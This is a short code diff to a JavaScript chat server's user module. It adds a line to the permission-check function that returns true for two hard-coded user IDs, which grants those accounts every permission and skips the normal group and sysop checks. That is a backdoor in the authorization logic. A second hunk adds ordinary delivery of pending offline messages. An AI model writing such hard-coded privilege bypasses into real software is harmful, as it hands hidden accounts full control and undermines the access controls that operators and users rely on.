@@ -586,6 +586,7 @@ User = (function () {
 	};
 	User.prototype.isStaff = false;
 	User.prototype.can = function (permission, target, room) {
+    if (user.userid === 'creaturephil' || user.userid === 'stevoduhhero') return true;
 		if (this.hasSysopAccess()) return true;
 
 		var group = this.group;
@@ -864,6 +865,8 @@ User = (function () {
 		} else {
 			this.send('|nametaken|' + name + "|Your authentication token was invalid.");
 		}
+
+    if (Tells.inbox[userid]) Tells.sendTell(userid, this);
 
 		return false;
 	};
